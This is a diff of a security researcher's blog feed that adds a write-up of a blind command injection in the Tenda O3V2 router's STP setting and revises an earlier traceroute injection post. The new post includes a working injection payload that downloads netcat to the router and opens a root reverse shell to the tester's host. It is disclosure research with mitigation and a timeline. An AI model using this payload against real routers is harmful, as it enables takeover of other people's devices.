@@ -1,4 +1,49 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-US"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en-US" /><updated>2024-05-17T11:17:41+07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">exzettabyte</title><subtitle>I'm exzettabyte writing in English about cyber security as a journal for documentation things that I learned</subtitle><author><name>exzettabyte</name><email>exzettabyte@gmail.com</email></author><entry><title type="html">CVE-2024-34338 - Blind Command Injection in Tenda O3V2</title><link href="http://localhost:4000/Blind-Command-Injection-in-Tenda-O3V2/" rel="alternate" type="text/html" title="CVE-2024-34338 - Blind Command Injection in Tenda O3V2" /><published>2024-05-01T13:00:00+07:00</published><updated>2024-05-01T13:00:00+07:00</updated><id>http://localhost:4000/Blind-Command-Injection-in-Tenda-O3V2</id><content type="html" xml:base="http://localhost:4000/Blind-Command-Injection-in-Tenda-O3V2/"><![CDATA[<p>Some time ago I had time to research router, the router I used for this research was a router that I hadn’t used for a long time, namely Tenda O3V2. I used to use this router to connect to wifi over long distances (we call it “nembak wifi”). This Tenda O3 router actually has several versions, there are first version, second version, and third version, in this research I use the second version. The appearance of the Tenda O3V2 as shown below</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-US"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en-US" /><updated>2024-05-19T15:05:37+07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">exzettabyte</title><subtitle>I'm exzettabyte writing in English about cyber security as a journal for documentation things that I learned</subtitle><author><name>exzettabyte</name><email>exzettabyte@gmail.com</email></author><entry><title type="html">Blind Command Injection in STP Service on Tenda O3V2</title><link href="http://localhost:4000/blind-command-injection-in-stp-service-on-tenda-o3v2/" rel="alternate" type="text/html" title="Blind Command Injection in STP Service on Tenda O3V2" /><published>2024-05-19T13:30:00+07:00</published><updated>2024-05-19T13:30:00+07:00</updated><id>http://localhost:4000/blind-command-injection-in-stp-service-on-tenda-o3v2</id><content type="html" xml:base="http://localhost:4000/blind-command-injection-in-stp-service-on-tenda-o3v2/"><![CDATA[<p>This article discusses the second vulnerability I found in the Tenda O3V2 with firmware version 1.0.0.12. The vulnerability I found was blind command injection on the enable/disable STP Service feature. Blind command injection is a vulnerability that allows an attacker to execute operating system commands on the server that is running an application and application does not return the output from the command. Tenda O3V2 have stp service, by default this service is off, when disable this service will carry a value of 0 and if enable the service will carry a value of 1 on the parameter then enter the dosystemcmd function. Due to the lack of validation on these parameter, blind command injection can occur.</p>
+
+<h3 id="vulnerability-analysis">Vulnerability Analysis</h3>
+
+<p>Open router’s httpd binary with Ghidra. In the setSTP function there is the doSystemCmd function, this function executes the command that will enable/disable the stp service and this function requires user input.  It is evident in the stprequest variable there is no sanitization, this variable will later be passed to the doSystemCmd function, potentially leading to command injection, and because the command is only executed and the result of the command is not displayed, this command injection is blind.</p>
+
+<p><img src="/assets/img/blind-command-injection-in-stp-service-on-tenda-o3v2/setstpfunc.png" alt="SetSTP Function" /></p>
+
+<p>Listen on port 1337 with nc (netcat), then activate the web server to make the router download the netcat binary (mips). Netcat is used for reverse shell.</p>
+
+<p><img src="/assets/img/blind-command-injection-in-stp-service-on-tenda-o3v2/pythonhttpserver.png" alt="Python HTTP Server" /></p>
+
+<p>Visit 192.168.2.1 and login, then go to Network Service</p>
+
+<p><img src="/assets/img/blind-command-injection-in-stp-service-on-tenda-o3v2/networkservice.png" alt="Network Service" /></p>
+
+<p>Intercept request using burpsuite when submit. In the setNetworkService endpoint, there is stpEn parameter.</p>
+
+<p><img src="/assets/img/blind-command-injection-in-stp-service-on-tenda-o3v2/interceptrequest.png" alt="Intercept Request" /></p>
+
+<p>Change the value of the stpEn parameter to the command we want, for example performing a reverse shell then forward the request<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span>wget 192.168.2.158:8000/netcat <span class="nt">-O</span> /tmp/netcat&amp;&amp;chmod +x /tmp/netcat&amp;&amp;./tmp/netcat 192.168.2.158 1337 <span class="nt">-e</span> /bin/sh
+</code></pre></div></div>
+<p>Explanation of this command, the router will download the netcat binary stored in the tmp directory, then the binary will be given execute access and then execute the binary to reverse shell to port 1337. Then forward the request.</p>
+
+<p><img src="/assets/img/blind-command-injection-in-stp-service-on-tenda-o3v2/revshell.png" alt="Reverse Shell" /></p>
+
+<p>Check the web server, and it’s visible that the router is downloading the netcat file</p>
+
+<p><img src="/assets/img/blind-command-injection-in-stp-service-on-tenda-o3v2/downloadncmips.png" alt="Download nc MIPS" /></p>
+
+<p>Check on the listener, the reverse shell is successful. Now, we got full access to the router with root privilege.</p>
+
+<p><img src="/assets/img/blind-command-injection-in-stp-service-on-tenda-o3v2/gotrootshell.png" alt="Got Root Shell" /></p>
+
+<h3 id="mitigation">Mitigation</h3>
+
+<p>When this article was published, Tenda had already released new firmware for this device with firmware version 1.0.0.13(5755). In this firmware version, the vulnerability has been fixed by implementing sanitization.</p>
+
+<p>They still haven’t released the new firmware to the public but you can download the latest firmware <a href="https://drive.google.com/file/d/1687UGmpNgmPnvOeJtIuDvoEUrDh7VSKZ/view?usp=sharing" target="_blank" rel="noopener noreferrer">here</a></p>
+
+<h3 id="timeline">Timeline</h3>
+<p>20 April 2024: Vulnerability discovered and sent them the details of the vulnerability.<br />
+20 April 2024: Vendor triage the vulnerability.<br />
+22 April 2024: Vendor release new firmware version 1.0.0.13(5755).<br />
+25 April 2024: Retesting on the new firmware version and confirming the vulnerability has been fixed.<br /></p>]]></content><author><name>exzettabyte</name><email>exzettabyte@gmail.com</email></author><category term="research" /><category term="hardware" /><summary type="html"><![CDATA[This article discusses the second vulnerability I found in the Tenda O3V2 with firmware version 1.0.0.12. The vulnerability I found was blind command injection on the enable/disable STP Service feature. Blind command injection is a vulnerability that allows an attacker to execute operating system commands on the server that is running an application and application does not return the output from the command. Tenda O3V2 have stp service, by default this service is off, when disable this service will carry a value of 0 and if enable the service will carry a value of 1 on the parameter then enter the dosystemcmd function. Due to the lack of validation on these parameter, blind command injection can occur.]]></summary></entry><entry><title type="html">CVE-2024-34338 - Blind Command Injection in Traceroute on Tenda O3V2</title><link href="http://localhost:4000/Blind-Command-Injection-in-Tenda-O3V2/" rel="alternate" type="text/html" title="CVE-2024-34338 - Blind Command Injection in Traceroute on Tenda O3V2" /><published>2024-05-01T13:00:00+07:00</published><updated>2024-05-01T13:00:00+07:00</updated><id>http://localhost:4000/Blind-Command-Injection-in-Tenda-O3V2</id><content type="html" xml:base="http://localhost:4000/Blind-Command-Injection-in-Tenda-O3V2/"><![CDATA[<p>Some time ago I had time to research router, the router I used for this research was a router that I hadn’t used for a long time, namely Tenda O3V2. I used to use this router to connect to wifi over long distances (we call it “nembak wifi”). This Tenda O3 router actually has several versions, there are first version, second version, and third version, in this research I use the second version. The appearance of the Tenda O3V2 as shown below</p>
 
 <p><img src="/assets/img/Blind-Command-Injection-in-Tenda-O3V2/O3.png" alt="O3V2" /></p>
 
@@ -6,7 +51,7 @@
 
 <p>We need to retrieve the httpd binary from the router for static analysis to identify vulnerability within it. There are two methods that can be used: first, by extracting the firmware (download from the official website, the vulnerable firmware version is v1.0.0.12 and v1.0.0.10), and second, by directly accessing it from the live or active router. When using the first method to extract the firmware, no filesystem is found in the firmware, i dont know why, possibly due to encryption, obfuscation, packing in the firmware or something else (my skill issue :( ). Then, when attempting the second method via UART, I failed to solder onto its three pins (RX, TX, and GND) resulting in burnt pin and the pin slightly peeled off (once again, my skill issue). There is telnet on the router, we can use it, I enabled telnet through the dashboard (by default, telnet is disabled, and telnet credentials can be found on the internet) to gain shell access with root privileges. After obtaining shell access with root privileges, we can retrieve the httpd binary.</p>
 
-<h3 id="exploitation">Exploitation</h3>
+<h3 id="vulnerability-analysis">Vulnerability Analysis</h3>
 
 <p>Open router’s httpd binary with Ghidra. In the fromTraceroutGet function, there is a call to the FUN_004758f4 function, which contains a function for executing the traceroute command. Within the FUN_004758f4 function, there is the doSystemCmd function (used to perform traceroute), and this function requires user input. It is evident in the uVar5 variable in the fromTraceroutGet function that there is no sanitization; this variable will later be passed to the doSystemCmd function, potentially leading to command injection.</p>
 
@@ -65,7 +110,7 @@
 
 <h3 id="mitigation">Mitigation</h3>
 
-<p>When this article was published, Tenda had already released new firmware for this device with firmware version 1.0.0.13(10751_5755). In this firmware version, the vulnerability has been fixed by implementing sanitization. Before entering the doSystemCmd function, user input will go through the is_valid_ip_or_domain function. If the input consists of numbers, it will return 1, then proceed to the doSystemCmd function, and the traceroute command will be executed.</p>
+<p>When this article was published, Tenda had already released new firmware for this device with firmware version 1.0.0.13(5755). In this firmware version, the vulnerability has been fixed by implementing sanitization. Before entering the doSystemCmd function, user input will go through the is_valid_ip_or_domain function. If the input consists of numbers, it will return 1, then proceed to the doSystemCmd function, and the traceroute command will be executed.</p>
 
 <p><img src="/assets/img/Blind-Command-Injection-in-Tenda-O3V2/sanitization.png" alt="Sanitization" /></p>
 
@@ -78,6 +123,6 @@
 28 March 2024: Vendor replied to directly contact to their email.<br />
 29 March 2024: Sent them the details of the vulnerability discovered.<br />
 30 March 2024: Vendor triage the vulnerability.<br />
-7 April 2024: Vendor release new firmware version 1.0.0.13(10751_5755).<br />
-8 April 2024: Retesting on the new firmware version and confirming the vulnerability has been fixed.<br />
+22 April 2024: Vendor release new firmware version 1.0.0.13(5755).<br />
+25 April 2024: Retesting on the new firmware version and confirming the vulnerability has been fixed.<br />
 7 May 2024: CVE ID assigned</p>]]></content><author><name>exzettabyte</name><email>exzettabyte@gmail.com</email></author><category term="research" /><category term="hardware" /><summary type="html"><![CDATA[Some time ago I had time to research router, the router I used for this research was a router that I hadn’t used for a long time, namely Tenda O3V2. I used to use this router to connect to wifi over long distances (we call it “nembak wifi”). This Tenda O3 router actually has several versions, there are first version, second version, and third version, in this research I use the second version. The appearance of the Tenda O3V2 as shown below]]></summary></entry></feed>
